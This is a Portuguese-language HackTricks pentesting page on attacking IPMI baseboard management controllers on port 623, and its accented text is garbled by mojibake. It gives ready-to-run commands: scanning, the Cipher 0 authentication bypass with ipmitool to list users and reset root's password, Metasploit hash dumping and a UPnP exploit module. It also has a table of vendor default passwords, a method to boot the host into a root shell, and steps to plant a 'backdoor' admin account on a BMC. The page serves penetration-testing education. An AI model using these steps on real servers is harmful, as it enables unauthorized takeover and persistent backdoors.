## 623/UDP/TCP - IPMI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

A [Interface de Gerenciamento de Plataforma Inteligente](https://www.thomas-krenn.com/en/wiki/IPMI\_Basics) (`IPMI`) √© um conjunto de especifica√ß√µes padronizadas para sistemas de gerenciamento de host baseados em hardware usados para gerenciamento e monitoramento do sistema. Ele age como um subsistema aut√¥nomo e funciona independentemente do BIOS, CPU, firmware e sistema operacional subjacente do host. O IPMI fornece aos administradores de sistemas a capacidade de gerenciar e monitorar sistemas mesmo que estejam desligados ou em um estado n√£o responsivo. Ele opera usando uma conex√£o de rede direta com o hardware do sistema e n√£o requer acesso ao sistema operacional por meio de um shell de login. O IPMI tamb√©m pode ser usado para atualiza√ß√µes remotas em sistemas sem exigir acesso f√≠sico ao host de destino. O IPMI √© tipicamente usado de tr√™s maneiras:

* Antes que o sistema operacional seja iniciado para modificar as configura√ß√µes do BIOS
* Quando o host est√° totalmente desligado
* Acesso a um host ap√≥s uma falha do sistema

Quando n√£o est√° sendo usado para essas tarefas, o IPMI pode monitorar uma variedade de coisas diferentes, como temperatura do sistema, voltagem, status do ventilador e fontes de alimenta√ß√£o. Ele tamb√©m pode ser usado para consultar informa√ß√µes de invent√°rio, revisar logs de hardware e alertar usando SNMP. O sistema host pode estar desligado, mas o m√≥dulo IPMI requer uma fonte de alimenta√ß√£o e uma conex√£o LAN para funcionar corretamente.

O protocolo IPMI foi publicado pela primeira vez pela Intel em 1998 e agora √© suportado por mais de 200 fornecedores de sistemas, incluindo Cisco, Dell, HP, Supermicro, Intel e outros. Sistemas que usam a vers√£o 2.0 do IPMI podem ser administrados via serial sobre LAN, dando aos administradores de sistemas a capacidade de visualizar a sa√≠da do console serial em banda. Para funcionar, o IPMI requer os seguintes componentes:

* Controlador de Gerenciamento de Placa Base (BMC) - Um microcontrolador e componente essencial de um IPMI
* Intelligent Chassis Management Bus (ICMB) - Uma interface que permite a comunica√ß√£o de um chassi para outro
* Intelligent Platform Management Bus (IPMB) - estende o BMC
* Mem√≥ria IPMI - armazena coisas como o log de eventos do sistema, dados do reposit√≥rio de armazenamento e muito mais
* Interfaces de comunica√ß√£o - interfaces do sistema local, interfaces seriais e LAN, ICMB e PCI Management Bus

![](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Porta padr√£o**: 623/UDP/TCP (geralmente est√° em UDP, mas tamb√©m pode estar em TCP)

## Enumera√ß√£o

### Descoberta
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Voc√™ pode **identificar** a **vers√£o** usando:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### Vulnerabilidade - Bypass de Autentica√ß√£o IPMI via Cipher 0

Dan Farmer [identificou uma falha grave](http://fish2.com/ipmi/cipherzero.html) na especifica√ß√£o IPMI 2.0, ou seja, o tipo de cifra 0, um indicador de que o cliente deseja usar autentica√ß√£o em texto claro, na verdade **permite o acesso com qualquer senha**. Problemas com o Cipher 0 foram identificados em BMCs da HP, Dell e Supermicro, sendo que o problema provavelmente abrange todas as implementa√ß√µes do IPMI 2.0.\
Observe que, para explorar esse problema, voc√™ primeiro precisa **encontrar um usu√°rio v√°lido**.

Voc√™ pode **identificar** esse problema usando:
```
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
E voc√™ pode **abusar** desse problema com o `ipmitool`:
```bash
apt-get install ipmitool #Install
#Using -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list #Use Cipher 0 to dump a list of users
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 #Change the password of root
```
### Vulnerabilidade - Recupera√ß√£o Remota de Hash de Senha de Autentica√ß√£o RAKP do IPMI 2.0

Basicamente, **voc√™ pode solicitar ao servidor o hash MD5 e SHA1 salgado de qualquer nome de usu√°rio e, se o nome de usu√°rio existir, esses hashes ser√£o enviados de volta.** Sim, t√£o incr√≠vel quanto parece. E h√° um **m√≥dulo do Metasploit** para testar isso (voc√™ pode selecionar a sa√≠da no formato John ou Hashcat):
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
_Observa√ß√£o: para isso, voc√™ s√≥ precisa de uma lista de nomes de usu√°rio para for√ßa bruta (o metasploit j√° cont√©m uma com nomes de usu√°rio padr√£o)._

Usando o `ipmitool` para ignorar a autentica√ß√£o (`-c 0`) e alterar a senha de root para abc123:
```
root@kali:~# apt-get install ipmitool
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123
```
### Vulnerabilidade - Autentica√ß√£o An√¥nima IPMI

Al√©m dos problemas de autentica√ß√£o acima, Dan Farmer observou que muitos BMCs s√£o enviados com acesso "an√¥nimo" habilitado por padr√£o. Isso √© configurado definindo o nome de usu√°rio da primeira conta de usu√°rio como uma string nula e definindo uma senha nula para corresponder. O m√≥dulo _ipmi\_dumphashes_ identificar√° e despejar√° as hashes de senha (incluindo senhas em branco) para contas de usu√°rio nulas. Essa conta pode ser dif√≠cil de usar por conta pr√≥pria, mas podemos aproveitar o `ipmitool` para redefinir a senha de uma conta de usu√°rio nomeada e aproveitar essa conta para acessar outros servi√ßos:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list

ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
1                    false  false      true      ADMINISTRATOR
2  root            false  false      true      ADMINISTRATOR
3  admin            true    true      true      ADMINISTRATOR

ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword #Change the password of the user 2 (root) to "newpassword"
```
### Vulnerabilidade - Senhas em texto claro do IPMI Supermicro

A especifica√ß√£o IPMI 2.0 exige que o BMC responda a m√©todos de autentica√ß√£o baseados em HMAC, como SHA1 e MD5. Esse processo de autentica√ß√£o tem algumas fraquezas graves, como demonstrado em exemplos anteriores, mas tamb√©m **requer acesso √† senha em texto claro para calcular o hash de autentica√ß√£o**. Isso significa que o BMC deve armazenar uma **vers√£o em texto claro** de todas as senhas de usu√°rio configuradas em algum lugar do **armazenamento n√£o vol√°til**. No caso da **Supermicro**, essa localiza√ß√£o muda entre as vers√µes do firmware, mas √© **`/nv/PSBlock`** ou **`/nv/PSStore`**. As senhas est√£o espalhadas entre v√°rios blocos bin√°rios, mas s√£o f√°ceis de identificar, pois sempre seguem o nome de usu√°rio. Isso √© um problema s√©rio para qualquer organiza√ß√£o que usa senhas compartilhadas entre BMCs ou at√© mesmo diferentes tipos de dispositivos.
```bash
 cat /nv/PSBlock
  admin                      ADMINpassword^TT                    rootOtherPassword!
```
### Vulnerabilidade - Supermicro IPMI UPnP

A Supermicro inclui um **listener UPnP SSDP em execu√ß√£o na porta UDP 1900** no firmware IPMI de muitas de suas placas-m√£e recentes. Nas vers√µes anteriores a SMT\_X9\_218, este servi√ßo estava executando o SDK Intel para Dispositivos UPnP, vers√£o 1.3.1. Esta vers√£o √© vulner√°vel aos [problemas divulgados pela Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) em fevereiro de 2013, e um exploit para esta plataforma faz parte do Metasploit Framework. O interessante sobre este ataque √© que ele **fornece acesso root completo ao BMC**, algo que √© dif√≠cil de obter de outra forma. Tenha em mente que um invasor com acesso administrativo, seja pela rede ou a partir de um shell root no sistema host, pode rebaixar o firmware de um BMC Supermicro para uma vers√£o vulner√°vel e, em seguida, explor√°-lo. Uma vez que o acesso **root** √© **obtido**, √© poss√≠vel **ler credenciais em texto claro** do sistema de arquivos, **instalar** software adicional e integrar **backdoors** permanentes no BMC que sobreviveriam a uma reinstala√ß√£o completa do sistema operacional do host.
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

Observe que apenas a HP randomiza a senha durante o processo de fabrica√ß√£o.

| Nome do Produto                                     | Nome de Usu√°rio Padr√£o | Senha Padr√£o                             |
| --------------------------------------------------- | --------------------- | ---------------------------------------- |
| **HP Integrated Lights Out (iLO)**                  | Administrator         | \<cadeia de caracteres aleat√≥rios de 8 caracteres fabricada> |
| **Dell Remote Access Card (iDRAC, DRAC)**           | root                  | calvin                                   |
| **IBM Integrated Management Module (IMM)**          | USERID                | PASSW0RD (com um zero)                   |
| **Fujitsu Integrated Remote Management Controller** | admin                 | admin                                    |
| **Supermicro IPMI (2.0)**                           | ADMIN                 | ADMIN                                    |
| **Oracle/Sun Integrated Lights Out Manager (ILOM)** | root                  | changeme                                 |
| **ASUS iKVM BMC**                                   | admin                 | admin                                    |

## Explorando o Host a partir do BMC

Uma vez obtido o acesso administrativo ao BMC, h√° v√°rios m√©todos dispon√≠veis que podem ser usados para obter acesso ao sistema operacional do host. O caminho mais direto √© abusar da funcionalidade KVM do BMC e reiniciar o host para um shell root (init=/bin/sh no GRUB) ou especificar um disco de resgate como um CD-ROM virtual e inicializar a partir dele. Uma vez obtido o acesso bruto ao disco do host, √© trivial introduzir uma porta dos fundos, copiar dados do disco r√≠gido ou fazer qualquer coisa necess√°ria como parte da avalia√ß√£o de seguran√ßa. A grande desvantagem, √© claro, √© que o host tem que ser reiniciado para usar este m√©todo. Obter acesso ao host em execu√ß√£o √© muito mais complicado e depende do que o host est√° executando. Se o console f√≠sico do host for deixado conectado, torna-se trivial sequestr√°-lo usando a funcionalidade KVM integrada. O mesmo se aplica aos consoles seriais - se a porta serial estiver conectada a uma sess√£o autenticada, o BMC pode permitir que esta porta seja sequestrada usando a interface ipmitool para serial-over-LAN (sol). Um caminho que ainda precisa de mais pesquisa √© abusar do acesso a hardware compartilhado, como o barramento i2c e o chip Super I/O.

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_bios.png)

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_boot.png)

![](<../.gitbook/assets/image (202) (2).png>)

## Explorando o BMC a partir do Host

Em situa√ß√µes em que um host com um BMC foi comprometido, a **interface local para o BMC pode ser usada para introduzir uma conta de usu√°rio de porta dos fundos**, e a partir da√≠ estabelecer uma posi√ß√£o permanente no servidor. Este ataque requer que o **`ipmitool`** esteja instalado no host e que o suporte ao driver esteja habilitado para o BMC. O exemplo abaixo demonstra como a interface local no host, que n√£o requer autentica√ß√£o, pode ser usada para injetar uma nova conta de usu√°rio no BMC. Este m√©todo √© universal em alvos Linux, Windows, BSD e at√© mesmo DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `porta: 623`

## Refer√™ncias

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
* [https://academy.hackthebox.com/module/112/section/1245](https://academy.hackthebox.com/module/112/section/1245)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
